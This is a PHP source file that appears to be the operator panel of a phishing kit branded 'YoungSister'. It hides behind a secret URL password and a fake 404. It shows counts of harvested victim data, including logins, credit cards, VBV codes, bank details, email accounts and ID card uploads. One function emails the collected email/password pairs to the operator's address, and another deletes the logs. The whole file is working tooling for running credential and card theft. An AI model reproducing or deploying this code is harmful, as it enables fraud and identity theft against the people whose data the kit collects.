<?php
error_reporting(0);
date_default_timezone_set("Asia/Jakarta");
include"main.php";
$random_id=sha1(md5(rand(0,1000000)));
$domain=preg_replace("/www\./i","",$_SERVER["SERVER_NAME"]);
$setting=get_setting($domain);
$panel=$setting["site_password"];
if($_GET["panel"]!=$panel){
	exit("<script>alert(\"404 Not Found\")</script><meta http-equiv=\"refresh\" content=\"0; url=/\"/>");
}

echo "<!DOCTYPE html>
<html lang='en' class=''>
   <head>
     <title>YoungSister</title>
      <meta charset='UTF-8'>
      <meta name=\"robots\" content=\"noindex\">
      <link href='https://fonts.googleapis.com/css?family=Titillium+Web:400,300,600' rel='stylesheet' type='text/css'>
      <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css'>
      <link href='https://fonts.googleapis.com/css?family=Pirata+One' rel='stylesheet' type='text/css'>


      <style class=\"cp-pen-styles\">*, *:before, *:after {
         box-sizing: border-box;
         }
         html {
         overflow-y: scroll;
         }
         body {
        background-image: url(\"../assets/img/bg.jpg\");
       
  background-repeat: no-repeat; /* Do not repeat the image */
  background-size: cover; /* Resize the background image to cover the entire container */
         font-family: 'Titillium Web', sans-serif;
         }
         a {
         text-decoration: none;
         color: #1ab188;
         transition: .5s ease;
         }
         a:hover {
         color: #179b77;
         }
         .form {
         background: rgba(0, 0, 0, 0.48);
         padding: 25px;
         max-width: 750px;
         margin: 40px auto;
         border-radius: 4px;
         box-shadow: 0 4px 10px 4px rgba(19, 35, 47, 0.3);
         }
         .tab-group {
         list-style: none;
         padding: 0;
         margin: 0 0 40px 0;
         }
         .tab-group:after {
         content: \"\";
         display: table;
         clear: both;
         }
         .tab-group li a {
         display: block;
         text-decoration: none;
         padding: 15px;
         background: rgba(160, 179, 176, 0.25);
         color: #a0b3b0;
         font-size: 20px;
         float: left;
         width: 33%;
         text-align: center;
         cursor: pointer;
         transition: .5s ease;
         }
         .tab-group li a:hover {
         background: #179b77;
         color: #ffffff;
         }
         .tab-group .active a {
         background: #1ab188;
         color: #ffffff;
         }
         .tab-content > div:last-child {
         display: none;
         }
         h1 {
         text-align: center;
         color: #ffffff;
         font-weight: 300;
         margin: 0 0 40px;
         }
         label {
         position: absolute;
         -webkit-transform: translateY(6px);
         transform: translateY(6px);
         left: 13px;
         color: rgba(255, 255, 255, 0.5);
         transition: all 0.25s ease;
         -webkit-backface-visibility: hidden;
         pointer-events: none;
         font-size: 22px;
         }
         label .req {
         margin: 2px;
         color: #1ab188;
         }
         label.active {
         -webkit-transform: translateY(50px);
         transform: translateY(50px);
         left: 2px;
         font-size: 14px;
         }
         label.active .req {
         opacity: 0;
         }
         label.highlight {
         color: #ffffff;
         }
         input, textarea {
         font-size: 22px;
         display: block;
         width: 100%;
         height: 100%;
         padding: 5px 10px;
         background: none;
         background-image: none;
         border: 1px solid #a0b3b0;
         color: #ffffff;
         border-radius: 0;
         transition: border-color .25s ease, box-shadow .25s ease;
         }
         input:focus, textarea:focus {
         outline: 0;
         border-color: #1ab188;
         }
         textarea {
         border: 2px solid #a0b3b0;
         resize: vertical;
         }
         input[type=submit] {
    display: block;
    height: 40px;
    width: 20%;
    margin: 0 auto;
    background: #27A6D1;
    text-align: center;
    color: #fff;
    line-height: 25px;
    font-size: 20px;
    font-weight: 300;
    cursor: pointer;
    padding: 0;
    border: none;
}
         .field-wrap {
         position: relative;
         margin-bottom: 40px;
         }
         .top-row:after {
         content: \"\";
         display: table;
         clear: both;
         }
         .top-row > div {
         float: left;
         width: 35%;
         margin-right: 4%;
         }
         .top-row > div:last-child {
         margin: 0;
         }
         .button {
         border: 0;
         outline: none;
         border-radius: 0;
         padding: 15px 0;
         font-size: 15px;
         font-weight: 600;
         text-transform: uppercase;
         letter-spacing: .1em;
         background: #1ab188;
         color: #ffffff;
         transition: all 0.5s ease;
         -webkit-appearance: none;
         }
         .button:hover, .button:focus {
         background: #179b77;
         }
         .button-block {
         display: block;
         width: 10%;
         }
         .forgot {
         margin-top: -20px;
         text-align: right;
         }
         /* Reset Select */
select {
  -webkit-appearance: none;
  -moz-appearance: none;
  -ms-appearance: none;
  appearance: none;
  outline: 0;
  box-shadow: none;
  border: 0 !important;
  background: #2c3e50;
  background-image: none;
}
/* Custom Select */
.select {
  position: relative;
  display: block;
  width: 75%;
  height: 40px;
  line-height: 3;
  background: #2c3e50;
  overflow: hidden;
  border-radius: .25em;
}
select {
  width: 100%;
  height: 100%;
  margin: 0;
  padding: 0 0 0 .5em;
  color: #fff;
  cursor: pointer;
}
select::-ms-expand {
  display: none;
}
/* Arrow */
.select::after {
  content: '\25BC';
  position: absolute;
  top: 0;
  right: 0;
  bottom: 0;
  padding: 0 1em;
  background: #34495e;
  pointer-events: none;
}
/* Transition */
.select:hover::after {
  color: #f39c12;
}
.select::after {
  -webkit-transition: .25s all ease;
  -o-transition: .25s all ease;
  transition: .25s all ease;
}
textarea {
  overflow: auto;
}
.button1 {
    background-color: black; 
    border: none;
    color: white;
    padding: 15px 32px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 16px;} /* Green */
.button2 {background-color: black;
    border: none;
    color: white;
    padding: 15px 32px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 16px;
} /* Blue */
.button3 {background-color: black;
    border: none;
    color: white;
    padding: 15px 32px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 16px;
} /* Red */ 
.button4 {background-color: black;
    border: none;
    color: white;
    padding: 15px 32px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 16px;
} /* Gray */ 
.button5 {background-color: black;
    border: none;
    color: white;
    padding: 15px 32px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 16px;
} /* Black */


.wallpapered {

    position: relative;
    outline: 1px dashed blue;
}
.wallpapered textarea {
    width: inherit;
    height: inherit;
}
.wallpapered .background {
    position: absolute;
    top: 40%;
    left: 40%;
    font-family: ' Pirata One';
    font-size: 30px;
    color: lime;
}
      </style>
   </head>
   <body>
      <div class=\"form\">
          <h1><font face=\"Pirata One\" size=\"10\" color=\"black\" style=\"text-shadow: 1px 0px .1em gold, -1px 1px .1em gold, -1px -1px .1em black\">
<font style=\"text-shadow: 0px 0px 6px rgb(255, 48, 175), 0px 0px 5px rgb(255, 48, 175), 0px 0px 5px rgb(255, 48, 175); color: rgb(255, 255, 255); font-weight: bold;\">
<font style=\"color:white;size=\" 5\";text-align: center;font-family:Pirata One; text-shadow: 3px 3px 3px red;\">
YOUNG SISTER</font></font></font></h1>
    <center><form method=\"POST\" action\"\"><button class=\"button3\" type=\"submit\" name=\"filter\">FILTER</button></form></li></center><br>
         
         <div class=\"tab-content\">
              ";if(isset($_POST["filter"])){echo "            <div id=\"bot\">
                 <div class=\"field-wrap\">
                     <div class=\"wallpapered\">
    <div class=\"background\">BOT FILTER</div>
<textarea wrap=\"off\" cols=\"60\" rows=\"5\">";include"logs/total_bot.txt";echo "</textarea>
</div>
                </div>
                <!--------------------------------------HR------------------------------------------------->
                <div class=\"field-wrap\">
                             <div class=\"wallpapered\">
    <div class=\"background\">VISITOR FILTER</div>
<textarea wrap=\"off\" cols=\"60\" rows=\"6\">";include"ip.txt";echo "</textarea>
</div>
                </div>
                ";}echo "                
            </div>
            <div id=\"mode\">
<center><button href=\"#\" class=\"button1\">Click <span class=\"badge\">";echo empty(file_get_contents("logs/log_visitor.txt"))?"0":count(file("logs/log_visitor.txt"));echo "</span></button>
<button href=\"#\" class=\"button2\">Login <span class=\"badge\">";echo empty(file_get_contents("logs/total_login.txt"))?"0":count(file("logs/total_login.txt"));echo "</span></button>
<button href=\"#\" class=\"button3\">CC <span class=\"badge\">";echo empty(file_get_contents("logs/total_cc.txt"))?"0":count(file("logs/total_cc.txt"));echo "</span></button>
<button href=\"#\" class=\"button1\">VBV <span class=\"badge\">";echo empty(file_get_contents("logs/total_vbv.txt"))?"0":count(file("logs/total_vbv.txt"));echo "</span></button><br><br>
<button href=\"#\" class=\"button1\">BANK <span class=\"badge\">";echo empty(file_get_contents("logs/total_bank.txt"))?"0":count(file("logs/total_bank.txt"));echo "</span></button>
<button href=\"#\" class=\"button1\">EMAIL <span class=\"badge\">";echo empty(file_get_contents("logs/total_email.txt"))?"0":count(file("logs/total_email.txt"));echo "</span></button>
<button href=\"#\" class=\"button2\">ID Card <span class=\"badge\">";echo empty(file_get_contents("logs/total_upload.txt"))?"0":count(file("logs/total_upload.txt"));echo "</span></button>
<br><br>
<form method=\"POST\" action\"\"><button class=\"button5\" type=\"submit\" name=\"rd\">Reset Log</button>
<button class=\"button2\" type=\"submit\" name=\"sd\">Get Log Empas</button>
         <center><font color=\"white\">YoungSister. &copy; ";echo date("Y");echo "</font></center>
      </div>
     
      <!-- /form -->
 ";if(isset($_POST["rd"])){unlink("ip.txt");unlink("block_bot.txt");unlink("logs/log_visitor.txt");unlink("logs/total_login.txt");unlink("logs/total_cc.txt");unlink("logs/total_vbv.txt");unlink("logs/total_upload.txt");unlink("logs/email_logs.txt");unlink("logs/total_bank.txt");unlink("logs/total_bin.txt");unlink("logs/total_email.txt");unlink("logs/total_bot.txt");unlink("error_log");echo"<script>alert('Success')</script>";echo"<meta http-equiv='refresh' content='0; url=#reset_data'/>";}else if(isset($_POST["sd"])){$empass=file_get_contents(dirname(__FILE__)."/logs/asd.txt");$exem=explode("
",$empass);$total=count($exem);$total=$total-1;if($total<=0 or!$empass){echo"<script>alert(\"Failed\\n\\Email And Password Not Found.\")</script>";}else{$headers="From: Empas Apel <empas@YoungSister.com>
";$headers.="Reply-to: a@YoungSister.online
";$headers.="MIME-Version: 1.0
";$headers.="Content-Type: text/plain; charset=UTF-8
";$subj="EMPAS [ Total $total Lines ] [ ".date("D, d-F-y H:i")." ]";$to=$setting["email_result"];$data="-===================== YoungSister =====================-
  -----------------------------------------------------------------
$empass
  -----------------------------------------------------------------";mail($to,$subj,$data,$headers);echo"<script>alert('Success')</script>";echo"<meta http-equiv='refresh' content='0; url=#send_empas'/>";}}echo " 


      <script src='//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
      <script >\$('.form').find('input, textarea').on('keyup blur focus', function (e) {
         var \$this = \$(this),
         label = \$this.prev('label');
         
         if (e.type === 'keyup') {
           if (\$this.val() === '') {
             label.removeClass('active highlight');
           } else {
             label.addClass('active highlight');
           }
         } else if (e.type === 'blur') {
           if (\$this.val() === '') {
             label.removeClass('active highlight');
           } else {
             label.removeClass('highlight');
           }
         } else if (e.type === 'focus') {
         
           if (\$this.val() === '') {
             label.removeClass('highlight');
           } else
           if (\$this.val() !== '') {
             label.addClass('highlight');
           }
         }
         
         });
         
         \$('.tab a').on('click', function (e) {
         
         e.preventDefault();
         
         \$(this).parent().addClass('active');
         \$(this).parent().siblings().removeClass('active');
         
         target = \$(this).attr('href');
         
         \$('.tab-content > div').not(target).hide();
         
         \$(target).fadeIn(600);
         
         });
        
      </script>
   </body>
</html>
";
?>